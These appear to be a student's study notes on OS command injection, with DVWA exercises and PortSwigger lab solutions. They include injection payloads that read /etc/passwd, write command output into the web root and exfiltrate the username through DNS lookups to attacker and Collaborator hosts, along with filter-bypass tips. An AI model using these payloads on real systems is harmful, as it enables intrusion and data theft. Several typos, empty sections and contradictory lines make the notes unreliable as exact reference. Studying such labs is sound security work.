# Command Injection with PortSwigger Validation Old

## What & Why OS Command Injection

* CS Command injection is a vulnerability where an attacker execute commands on the victim operating system via vulnerably web application.
* A command refers to an operation that interacts with the operating system (OS) at an OS level.
* Command Injection involves injecting and executing these commands within a system or application.

## Types

* Inband Command injections :- Where the attacker execute commands on Operating system via vulnerably web application and receiving the response of that executed commands in web application
* Outband Command Injection :- where the attacker execute commands on operating system via vulnerably web application and didn’t receive the execute command output within the web application.

## Impact of CIA

* Confidentiality :- Command injection can be used to view sensitive data.
* Integrity :- command injection can be used to alter the data.
* Availability :- command injection can be used to delete the data.

## Finding command Injection Vulnerability

### Black Box Perspective

* Map the application
  * Visits all the URL of the application, walk through all the pages that are accessible within the user context
  * As the running makes notes of all the input vector that talks to the backend understand how the application works
  * Try to figure out the logic behind the application while running burpsuite proxy at the backend.
  * Map all instance in the application where there is client side input
* FUZZ the application
  * Shell metacharactrs :- `&`, `&&`, `|`, `||`, `;`, `\n`, `` ` ``, `$()`
* For inband command injection analysis the response of the application to determine if it vulnerable. The response sometime output an error so to see that error is that error indicates that its vulnerably or not
* For blind Command injection
  * Trigger the time delay using the ping or sleep commands.(is does prove the vulnerability but its not impactfull and the way to get impact is)
  * Exfiltrate (Get) the data from application by outputting the response in Root directory and Getting that file directly using the browser.

### White Box Perspective

* Map all the vectors int the application.
* Review source code to determine if any of the input vectors are added as parameters to function that execute system commands.

## Exploiting Commands Injection

### Inband & outband Command Injection

* Using Shell metacharacteres.
  * Concatenate another commands
    * `&& cat /etc/passwd &`
    * `& cat /etc/passwd &`
    * `|| cat /ect/passwd &`
  * Trigger a time delay
    * `&& sleep 10 &`
    * `&& ping -c 10 127.0.0.01 &`
* Output the response of the command in the web root directly and get that file directly using browser
  * `& whomai > /var/www/static/whoami.txt &`
* Open an out of band channel back to the attacker server
  * `& nslookup attacker.server.com &`
  * `& nslookup $(whoami).attackerserverr.com &`
  * `& nslookup \`whoami\`.attackerserver.com &\`

## Automated Exploitations Tools

* BurpSuite
* Arachni
* Wapiti
* Acunetx
* W3af

## Preventing Command Injection Vulnerabilities

* To never call out to OS command from application layer code. Instead implement the required functionalilty usisng safer platform APIs.
  * For Example : `mkdir()` instead of `system("mkdir /directory_name")`
* Validate that the input is as expexted or valid input.

## Executing Multiple Commands

* For example:
* Piping: Used in Bash to chain two or more commands together, often used for filtering.
* `&&` (And Operator): Combines multiple commands, executing them one after another.
* `;` (Semicolon): Indicates the end of one command and allows a new command to follow.

### Purpose of command

| Purpose of command    | Linux         | Windows         |
| --------------------- | ------------- | --------------- |
| Name of current user  | `whoami`      | `whoami`        |
| Operating system      | `uname -a`    | `ver`           |
| Network configuration | `ifconfig`    | `ipconfig /all` |
| Network connections   | `netstat -an` | `netstat -an`   |
| Running processes     | `ps -ef`      | `tasklist`      |

## DVWA Low Level Security

* Normal Output Code Input
* When the "submit" button is clicked, data is sent via a POST request.
* `$target` is a request variable containing an IP address.
* The code determines the type of OS and uses different commands based on the OS type:
* If it's Windows, only 4 ping packets are sent.
* If it's Linux, the ping continues until stopped with `-c 4 $target`.

### Vulnerability Output

* The output should describe the vulnerability or potential security issue that exists in the code when dealing with the `$target` variable. However, the vulnerability output appears to be missing from the provided information.

## DVWA Medium Security Level

* Some functions like `&&`, `;`, and `,` are blocked and replaced with `''` (nothing).
* However, it does not block the use of `'One &'` and `|` (pipe) characters.
* Normal Output

### Vulnerability Output

## DVWA High Security Level

* However, there is a specific issue with the filtering of PIP `|` sections.
* The developer added a space character, which is crucial for proper filtering. Without this space, the PIP commands will work.
* Normal Output

### Vulnerability Output

* The vulnerability output is described as a "human error," suggesting that the omission of the space character in the filtering process can lead to vulnerabilities.
* This vulnerability could potentially allow attackers to execute unauthorized or malicious commands.

## PortSwigger Validation

### OS command injection, simple case

Notes

OS command injection, simple case

Goal :- inject whoami commands

already know this is vulnerable if not then put the charatices to find it.

```
productId=2 &whoam #&storeId=1
```

### Blind OS command injection with time delays

Notes

Blind OS command injection with time delays

Goal :- inject the ping commands

the blind injection can be detected by ping command.

The only paramerter which talks to backent is SQL query and Submit forms

```
& sleep 10 #
```

the name parameter is not vulnerably.

the email parameter is vulnerably.

The email parameter is not vulnerably

### Blind OS command injection with output redirection

Notes:-

Blind OS command injection with output redirection

Goal:- command injection

Analysis:-

{% stepper %}
{% step %}
### Confirm its vulnerably to blind command injection

using sleep commands
{% endstep %}

{% step %}
### find a place in application to redirect the injected output. where the images are stored.

there is images folder , normally all web application is used `/var/www/images`
{% endstep %}

{% step %}
### redirect the injected command into a file.

redirect to images.
{% endstep %}

{% step %}
### check if the file was creadted.

its created in filename=shadow.txt
{% endstep %}
{% endstepper %}

Got the vulnerably parameter using sleep

Found the images parameter where the injection commands will be saved. `/images/filenames.png`

### Blind OS command injection with out-of-band interaction

Notes:-

Blind OS command injection with out-of-band interaction

Goal :- Command injection Out of band.

Analysis:-

The email paramter is vulnerably.

```
4mrs4lc3ri6vrmzj4sxbxv9oifo5cu.burpcollaborator.net
```

```
& nslookup 4mrs4lc3ri6vrmzj4sxbxv9oifo5cu.burpcollaborator.net #
```

### Blind OS command injection with out-of-band data exfiltration

Notes:-

Blind OS command injection with out-of-band data exfiltration

Goal :- out of band command injection with whoami

Analysis:-

Check the out of band and dns resolved.

```
& nslookup kzn8h1pj4yjb42czh8arabm4vv1mpb.burpcollaborator.net #
```

DNS query is resolveing.

```
& nslookup $(whoami)kzn8h1pj4yjb42czh8arabm4vv1mpb.burpcollaborator.net #
```

```
peter-GMd1wg.kzn8h1pj4yjb42czh8arabm4vv1mpb.burpcollaborator.net
```

```
`peter-GMd1wg`kzn8h1pj4yjb42czh8arabm4vv1mpb.burpcollaborator.net
```
